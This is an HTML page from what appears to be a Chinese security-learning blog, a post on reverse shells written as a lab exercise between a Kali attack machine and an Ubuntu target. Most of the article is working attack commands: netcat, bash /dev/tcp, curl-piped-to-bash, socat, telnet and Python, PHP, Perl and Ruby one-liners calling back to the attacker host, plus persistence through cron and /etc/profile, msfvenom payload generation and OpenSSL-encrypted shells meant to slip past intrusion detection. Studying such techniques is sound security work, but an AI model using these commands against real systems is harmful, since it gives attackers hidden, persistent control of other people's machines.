@@ -1,0 +1,588 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="welcome to my blog" href="https://hq185187.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="welcome to my blog" href="https://hq185187.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="welcome to my blog" href="https://hq185187.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="java,git,springcloud" />
+
+
+<link rel="canonical" href="https://hq185187.github.io/2023/06/21/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/">
+
+
+
+  <title>
+反弹shell学习 |
+不良人天藏星 = welcome to my blog = 不良人总舵</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">反弹shell学习
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-06-21 21:44:24">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-06-21T21:44:24+08:00">2023-06-21</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>3.9k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>4 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">不良人天藏星</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="/assets/1.avif">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://hq185187.github.io/2023/06/21/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="hq185187">
+    <meta itemprop="description" content="不良人总舵, 不定时更新web安全相关知识">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="welcome to my blog">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h3 id="什么是反弹shell"><a class="markdownIt-Anchor" href="#什么是反弹shell">#</a> 什么是反弹 shell</h3>
+<p>reverse shell, 就是控制端监听在某 TCP/UDP 端口，被控端请求到该控制端端口，并将祺命令行的输入输出转到控制端</p>
+<h3 id="什么时候用"><a class="markdownIt-Anchor" href="#什么时候用">#</a> 什么时候用？</h3>
+<p>通常用于被控端防火墙受限，权限不足，端口被占用等情形<br>
+假设我们攻击了一台机器，打开了该机器的一个端口，我们可以用自己的机器去连接目标机器，这种叫正向连接，远程桌面，web 服务，ssh，telnet 等等<br>
+但是以下情况：</p>
+<ol>
+<li>客户机中了你的马，但是在局域网内</li>
+<li>它的 ip 会动态改变，不能持续控制</li>
+<li>防火墙限制，对方只能发送请求，不能接收请求<br>
+此时只能反弹 shell，就是攻击者指定服务器，受害者主机主动连接攻击者的服务端程序</li>
+</ol>
+<p>环境：<br>
+192.168.81.122（kali 攻击机）<br>
+192.168.81.113  ubuntu)</p>
+<h3 id="netcat反弹shell"><a class="markdownIt-Anchor" href="#netcat反弹shell">#</a> netcat 反弹 shell</h3>
+<p>Linux 默认带 netcat 但是为了安全考虑把反弹 shell 的 - e 给删了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure>
+<p>攻击机开启监听：<br>
+netcat -lvnp 23333<br>
+ 目标机主动连接：<br>
+netcat  192.168.81.122 23333 -e /bin/bash<br>
+<img data-src="https://s2.loli.net/2023/06/21/xYqT8Eb9t1OXUkZ.png" alt="屏幕截图 2023-06-21 183357.png"></p>
+<h3 id="利用bash反弹shell"><a class="markdownIt-Anchor" href="#利用bash反弹shell">#</a> 利用 bash 反弹 shell</h3>
+<p>常用:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+<p>解析:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 产生一个bash交互环境</span><br><span class="line">&gt;&amp;    将联合符号前面的内容与后面相结合，然后一起重定向给后者。</span><br><span class="line">/dev/tcp/ip/port  让目标主机与攻击机ip的port端口建立一个tcp连接</span><br><span class="line">0&gt;&amp;1  将标准输入与输出的内容相结合,然后重定向到前面标准输出的内容</span><br></pre></td></tr></table></figure>
+<p>实操:<br>
+kali:<br>
+nc -lvnp 23333<br>
+ubuntu:<br>
+bash -i &gt;&amp; /dev/tcp/192.168.81.122/23333 0&gt;&amp;1</p>
+<p><img data-src="https://s2.loli.net/2023/06/21/Pog29TSt4VZ5zbM.png" alt="屏幕截图 2023-06-21 185633.png"></p>
+<h3 id="curl配合bash反弹shell"><a class="markdownIt-Anchor" href="#curl配合bash反弹shell">#</a> Curl 配合 Bash 反弹 shell</h3>
+<p>在 kali 的 www 目录下创建一个 index.php 或者 index.html</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.81.122/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>Ubuntu:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.81.122|bash</span><br></pre></td></tr></table></figure>
+<h3 id="反弹shell写进定时任务"><a class="markdownIt-Anchor" href="#反弹shell写进定时任务">#</a> 反弹 shell 写进定时任务</h3>
+<p>假设当前用户名为 root,centos 主机写进 /var/spool/cron/root,Ubuntu/Debian 主机写进 /var/spool/cron/crontabs/root 中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span><br></pre></td></tr></table></figure>
+<p>反弹 shell 命令写进 /etc/profile 文件<br>
+ /etc/profile 文件的内容会在用户打开 bash 窗口的时候执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1 &amp;</span><br><span class="line"># 最后面那个&amp;为的是防止管理员无法输入命令</span><br></pre></td></tr></table></figure>
+<p>当目标主机管理员远程连接该主机时，就会成功执行 shell 命令</p>
+<h3 id="利用socat反弹shell"><a class="markdownIt-Anchor" href="#利用socat反弹shell">#</a> 利用 Socat 反弹 shell</h3>
+<p>Socat 功能与 netcat 类似，据说是 netcat 的加强版<br>
+使用:<br>
+kali</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:2333 -</span><br><span class="line">或者</span><br><span class="line">nc -lvnp 2333</span><br></pre></td></tr></table></figure>
+<p>ubuntu<br>
+ 安装:apt install socat</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-connect:192.168.81.122:2333 exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
+<p>结果:<br>
+<img data-src="https://s2.loli.net/2023/06/21/NscbIgO2WjiSGMU.png" alt="屏幕截图 2023-06-21 202214.png"></p>
+<p><img data-src="https://s2.loli.net/2023/06/21/y2zbgodxYUOIHfC.png" alt="屏幕截图 2023-06-21 202241.png"></p>
+<h3 id="利用telnet反弹shell"><a class="markdownIt-Anchor" href="#利用telnet反弹shell">#</a> 利用 Telnet 反弹 shell</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 2333(kali)</span><br><span class="line"></span><br><span class="line">mknod a p; telnet 192.168.81.122 2333 0&lt;a | /bin/bash 1&gt;a</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://s2.loli.net/2023/06/21/qXZ5NnMIYGamDUA.png" alt="屏幕截图 2023-06-21 202723.png"><br>
+<img data-src="https://s2.loli.net/2023/06/21/n1tvjUQyO2lBwz9.png" alt="屏幕截图 2023-06-21 202732.png"></p>
+<h3 id="各种脚本执行反弹shell"><a class="markdownIt-Anchor" href="#各种脚本执行反弹shell">#</a> 各种脚本执行反弹 shell</h3>
+<h4 id="python脚本反弹shell"><a class="markdownIt-Anchor" href="#python脚本反弹shell">#</a> python 脚本反弹 shell</h4>
+<p>当目标主机上有 python 环境时，可以用 python 来反弹 shell<br>
+ 攻击机:   nc -lvnp 2333<br>
+ 目标机主动连接攻击机:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.81.122&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="php脚本反弹shell"><a class="markdownIt-Anchor" href="#php脚本反弹shell">#</a> php 脚本反弹 shell</h4>
+<p>目标机主动连接:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.81.122&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="perl脚本反弹shell"><a class="markdownIt-Anchor" href="#perl脚本反弹shell">#</a> Perl 脚本反弹 shell</h4>
+<p>目标机:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.81.122&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="ruby脚本反弹shell"><a class="markdownIt-Anchor" href="#ruby脚本反弹shell">#</a> Ruby 脚本反弹 shell</h4>
+<p>目标机:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.81.122&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.81.122&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="metasploit生产反弹shell的一句话"><a class="markdownIt-Anchor" href="#metasploit生产反弹shell的一句话">#</a> Metasploit 生产反弹 shell 的一句话</h4>
+<p>当我们忘记前面的语句时可以用 metasploit 来生成<br>
+ <code>msfvenom -l payloads | grep 'cmd/unix/reverse'</code></p>
+<p>比如我们生产一个 python 的:</p>
+<p><code>msfvenom -p cmd/unix/reverse_python LHOST=192.168.81.122 LPORT=2333 -f raw</code></p>
+<h3 id="反弹shell后获取模拟终端"><a class="markdownIt-Anchor" href="#反弹shell后获取模拟终端">#</a> 反弹 shell 后获取模拟终端</h3>
+<p>此时获得的 shell 不是一个标准的虚拟终端环境，交互性非常差，vim 和 sudo 这种操作都做不了，此时我们可以借助 python 的 pty 库来获取一个标准的虚拟终端环境.</p>
+<p>在获取的 shell 里输入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="openssl反弹加密shell"><a class="markdownIt-Anchor" href="#openssl反弹加密shell">#</a> OpenSSL 反弹加密 shell</h3>
+<p>上文的反弹 shell 方法的所有的流量都是<mark>明文传输的</mark>，这些通过 shell 传输的流量都能被管理员直接抓取和理解，若目标主机有网络防御检测系统 (IDS,IPS 等), 会把我们的通信内容进行告警和阻止，因此我们需要对通信的内容进行安全通信，避免窃听，同时确认另一端连接着的身份</p>
+<h4 id="openssl简历"><a class="markdownIt-Anchor" href="#openssl简历">#</a> OpenSSL 简历</h4>
+<p>它时一个开发源代码的软件包库，应用程序可以使用这个包来进行安全通信，避免窃听，同时确定另一端连接者的身份<br>
+使用前需要先生产自签名证书:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>
+<h4 id="使用openssl反弹加密shell"><a class="markdownIt-Anchor" href="#使用openssl反弹加密shell">#</a> 使用 OpenSSL 反弹加密 shell</h4>
+<p>攻击机:<br>
+ 首先需要利用上一步生成的自签名证书</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 2333</span><br></pre></td></tr></table></figure>
+<p>此时的 Open SSL 在攻击机的 2333 端口启动了一个 SSL/TLS server<br>
+ 目标机:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.81.122:2333 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>
+<p>结果:<br>
+<img data-src="https://s2.loli.net/2023/06/21/uj6WzPMqKcikZFh.png" alt="屏幕截图 2023-06-21 214152.png"></p>
+<p><img data-src="https://s2.loli.net/2023/06/21/kwKvQHPf372FuGy.png" alt="屏幕截图 2023-06-21 214142.png"></p>
+
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-06-21 21:47:24" itemprop="dateModified" datetime="2023-06-21T21:47:24+08:00">2023-06-21</time>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>hq185187 <i class="ic i-at"><em>@</em></i>welcome to my blog
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://hq185187.github.io/2023/06/21/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/" title="反弹shell学习">https://hq185187.github.io/2023/06/21/反弹shell学习/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/" itemprop="url" rel="prev" data-background-image="&#x2F;assets&#x2F;22.jpg" title="Mysql主从复制">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> SQL注入</span>
+  <h3>Mysql主从复制</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.</span> <span class="toc-text"> 什么是反弹 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text"> 什么时候用？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#netcat%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.</span> <span class="toc-text"> netcat 反弹 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.</span> <span class="toc-text"> 利用 bash 反弹 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl%E9%85%8D%E5%90%88bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.</span> <span class="toc-text"> Curl 配合 Bash 反弹 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%86%99%E8%BF%9B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">6.</span> <span class="toc-text"> 反弹 shell 写进定时任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8socat%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">7.</span> <span class="toc-text"> 利用 Socat 反弹 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8telnet%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">8.</span> <span class="toc-text"> 利用 Telnet 反弹 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">9.</span> <span class="toc-text"> 各种脚本执行反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">9.1.</span> <span class="toc-text"> python 脚本反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">9.2.</span> <span class="toc-text"> php 脚本反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#perl%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">9.3.</span> <span class="toc-text"> Perl 脚本反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ruby%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">9.4.</span> <span class="toc-text"> Ruby 脚本反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#metasploit%E7%94%9F%E4%BA%A7%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">9.5.</span> <span class="toc-text"> Metasploit 生产反弹 shell 的一句话</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-number">10.</span> <span class="toc-text"> 反弹 shell 后获取模拟终端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#openssl%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="toc-number">11.</span> <span class="toc-text"> OpenSSL 反弹加密 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#openssl%E7%AE%80%E5%8E%86"><span class="toc-number">11.1.</span> <span class="toc-text"> OpenSSL 简历</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8openssl%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="toc-number">11.2.</span> <span class="toc-text"> 使用 OpenSSL 反弹加密 shell</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="hq185187"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">hq185187</p>
+  <div class="description" itemprop="description">不定时更新web安全相关知识</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">26</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">2</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hxMTg1MTg3" title="https:&#x2F;&#x2F;github.com&#x2F;hq185187"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/NSSCTF/" title="分类于 NSSCTF精选">NSSCTF精选</a>
+</div>
+
+    <span><a href="/2023/05/12/nssctf2/" title="NSSCTF2">NSSCTF2</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/06/08/%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="原生类反序列化学习">原生类反序列化学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/" title="无字母数字rce">无字母数字rce</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="沙箱逃逸初学习">沙箱逃逸初学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/02/SSTI/" title="SSTI总结">SSTI总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/03/request%E5%BA%93/" title="requests学习">requests学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/unserialize-labs/" title="Unserialize-labs">Unserialize-labs</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/02/ssti-labs/" title="SSTI-Labs">SSTI-Labs</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/06/21/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/" title="反弹shell学习">反弹shell学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/23/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">hq185187 @ 不良人天藏星</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="站点总字数">149k 字</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
